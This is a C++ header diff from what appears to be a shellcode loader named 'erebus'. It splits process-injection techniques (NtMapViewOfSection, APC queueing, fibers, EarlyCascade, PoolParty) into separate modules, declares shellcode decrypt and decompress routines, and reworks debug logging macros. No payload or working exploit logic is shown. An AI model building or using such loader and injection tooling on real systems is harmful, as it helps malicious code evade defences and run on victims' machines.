@@ -7,6 +7,12 @@
 #include <windows.h>
 
 #include "config.hpp"
+#include "injection/injection_ntmapviewofsection.hpp"
+#include "injection/injection_ntqueueapcthread.hpp"
+#include "injection/injection_createfiber.hpp"
+#include "injection/injection_earlycascade.hpp"
+#include "injection/injection_poolparty.hpp"
+#include <cmath>
 
 // Define missing SAL annotations for compatibility
 #ifndef _In_
@@ -55,11 +61,11 @@
 
 #pragma region [typedefs]
 
-typedef struct _PROCESSOR_NUMBER {
-	USHORT Group;
-	UCHAR  Number;
-	UCHAR  Reserved;
-} PROCESSOR_NUMBER, * PPROCESSOR_NUMBER;
+// typedef struct _PROCESSOR_NUMBER {
+// 	USHORT Group;
+// 	UCHAR  Number;
+// 	UCHAR  Reserved;
+// } PROCESSOR_NUMBER, * PPROCESSOR_NUMBER;
 
 typedef struct _UNICODE_STRING {
 	USHORT Length;
@@ -2207,6 +2213,7 @@ typedef NTSTATUS(NTAPI* typeRtlCreateUnicodeString)(
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 #define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
 #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
 #define NERR_Success 0x00000000
 
 #define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
@@ -2252,11 +2259,12 @@ typedef NTSTATUS(NTAPI* typeRtlCreateUnicodeString)(
 
 #if _DEBUG
 #include <stdio.h>
-#define dprintf(fmt, ...)		printf(fmt, __VA_ARGS__)
-#define LOG_SUCCESS(fmt, ...)	printf(COLOUR_BOLD COLOUR_GREEN   "[+]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
-#define LOG_INFO(fmt, ...)		printf(COLOUR_BOLD COLOUR_BLUE    "[*]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
-#define LOG_ERROR(fmt, ...)		printf(COLOUR_BOLD COLOUR_RED     "[!]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
-#define LOG_DEBUG(fmt, ...)		printf(COLOUR_BOLD COLOUR_MAGENTA "[D]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
+#include <cstdio>
+#define dprintf(fmt, ...)		do { printf(fmt, ##__VA_ARGS__); fflush(stdout); } while(0)
+#define LOG_SUCCESS(fmt, ...)	do { printf(COLOUR_BOLD COLOUR_GREEN   "[+]" COLOUR_DEFAULT " [%s] " fmt "\n", __FUNCTION__, ##__VA_ARGS__); fflush(stdout); } while(0)
+#define LOG_INFO(fmt, ...)		do { printf(COLOUR_BOLD COLOUR_BLUE    "[*]" COLOUR_DEFAULT " [%s] " fmt "\n", __FUNCTION__, ##__VA_ARGS__); fflush(stdout); } while(0)
+#define LOG_ERROR(fmt, ...)		do { printf(COLOUR_BOLD COLOUR_RED     "[!]" COLOUR_DEFAULT " [%s] " fmt "\n", __FUNCTION__, ##__VA_ARGS__); fflush(stdout); } while(0)
+#define LOG_DEBUG(fmt, ...)		do { printf(COLOUR_BOLD COLOUR_MAGENTA "[D]" COLOUR_DEFAULT " [%s] " fmt "\n", __FUNCTION__, ##__VA_ARGS__); fflush(stdout); } while(0)
 #else
 #define dprintf(fmt, ...)     (0)
 #define LOG_SUCCESS(fmt, ...) (0)
@@ -2272,6 +2280,8 @@ typedef VOID(*typeDecryptionMethod)(_Inout_ BYTE* Input, IN SIZE_T InputLen, IN 
 typedef VOID(*typeDecompressionMethod)(_Inout_ BYTE** Input, _Inout_ SIZE_T* InputLen);
 typedef BOOL(*typeDecodeMethod)(_In_ const CHAR* Input, IN SIZE_T InputLen, _Out_ BYTE** Output, _Out_ SIZE_T* OutputLen);
 
+
+#include "injection/injection_dispatch.hpp"
 
 namespace erebus {
 	enum CompressionFormat {
@@ -2404,24 +2414,15 @@ namespace erebus {
 
 	VOID AutoDetectAndProcess(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen, _In_opt_ BYTE* Key, _In_opt_ SIZE_T KeyLen);
 
+	VOID DecryptShellcode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen);
+
+	VOID DecompressShellcode(_Inout_ BYTE** Shellcode, _Inout_ SIZE_T* ShellcodeLen);
+
 	BOOL StageResource(IN int resource_id, IN LPCWSTR resource_class, OUT PBYTE* shellcode, OUT SIZE_T* shellcode_size);
 
 	PVOID WriteShellcodeInMemory(IN HANDLE process_handle, IN BYTE* shellcode, IN SIZE_T shellcode_size);
 
 	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle);
-
-	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
-
-	VOID InjectionNtQueueApcThread(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
-
-	VOID InjectionCreateFiber(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
-
-	VOID InjectionEarlyCascade(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
-
-	VOID InjectionPoolParty(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
-
-	VOID InjectionPoolPartyAlt(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle);
-
 } // End of erebus namespace
 
 #endif
